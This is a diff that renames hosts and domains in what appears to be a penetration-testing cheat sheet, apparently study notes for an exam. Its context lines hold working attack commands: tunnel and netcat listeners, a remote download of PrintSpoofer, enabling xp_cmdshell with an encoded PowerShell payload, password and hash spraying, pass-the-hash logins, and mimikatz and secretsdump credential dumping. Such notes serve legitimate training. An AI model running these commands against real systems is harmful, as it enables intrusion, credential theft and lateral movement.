@@ -28,7 +28,7 @@ sudo ip route add 240.0.0.1/32 dev ligolo
 nmap 240.0.0.1 -sV
 
 //create additional listener
-[Agent : FAKE\web_svc@Target1] » listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4445 --tcp
+[Agent : FAKE\web_svc@Group2] » listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4445 --tcp
 nc -nlvp 4445 //connect
 python3 -m http.server 4445 //transfer file
 ```
@@ -382,7 +382,7 @@ Test invalid url. HTTP Error 400. The request hostname is invalid.
 
 ```jsx
 //Got hostname from nmap
-https://Target1.fake:8443/
+https://Group2.fake:8443/
 ```
 
 More Info after adding hostname to /etc/hosts
@@ -631,7 +631,7 @@ api.py
 /proc/self/cmdline
 
 //LFI & file upload
-upload authorized_keys to target
+upload authorized_keys
 ```
 
 Remote File Inclusion (RFI)
@@ -981,8 +981,8 @@ rce
 ```jsx
 SQL (FAKE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
-[*] INFO(Target2\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
-[*] INFO(Target2\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(Group2\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(Group2\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
 
 SQL (FAKE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQ...';
 ```
@@ -990,7 +990,7 @@ LigoloNG: Add tunnel bridge if mssql can only access internal machine
 
 
 ```jsx
-[Agent : OSCP\web_svc@Target1] » listener_add --addr 0.0.0.0:8082 --to 0.0.0.0:8081 --tcp
+[Agent : OSCP\web_svc@Group2] » listener_add --addr 0.0.0.0:8082 --to 0.0.0.0:8081 --tcp
 //transfer file
 python3 -m http.server 8081 #klai
 iwr -uri http://10.10.185.147:8082/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe 
@@ -1990,7 +1990,7 @@ nxc  smb 172.16.1.1 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
 nxc winrm 192.168.1.1  -u user.txt -H crack --no-bruteforce --continue-on-success
 
 //non domain user
-nxc winrm 10.10.111.1 -u user.txt -p pass -d Target2
+nxc winrm 10.10.111.1 -u user.txt -p pass -d Group2
 
 impacket-psexec dave@172.16.1.1
 //specify domain name for administrator
@@ -2010,7 +2010,7 @@ Spary NTLM hash
 //test smb(139,445),wmi(135),rdp(3389),winrm(5985)
 nxc smb 10.10.1.1 -u bob.alice -H e728ecbbbbbbbbbbbbbb
 //spray local
-nxc winrm 10.10.1.1 -u user.txt -p passW0rd -d Target2
+nxc winrm 10.10.1.1 -u user.txt -p passW0rd -d Group2
 evil-winrm -i 10.10.1.1 -u bob.alice -H e728ecbbbbbbbbbbbbbb
 xfreerdp /v:192.168.1.1 /u:fake.com/dave /pth:19b219b219b219b219b2 +clipboard +drive:share,/tmp
 ```
@@ -2043,7 +2043,7 @@ lsadump::trust
  "token::elevate" "lsadump::sam"
  
  //require local admin
-impacket-secretsdump Target2/Administrator:password@10.10.1.1
+impacket-secretsdump Group2/Administrator:password@10.10.1.1
  
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 secretsdump.py fake.com/Administrator:password@192.168.1.1
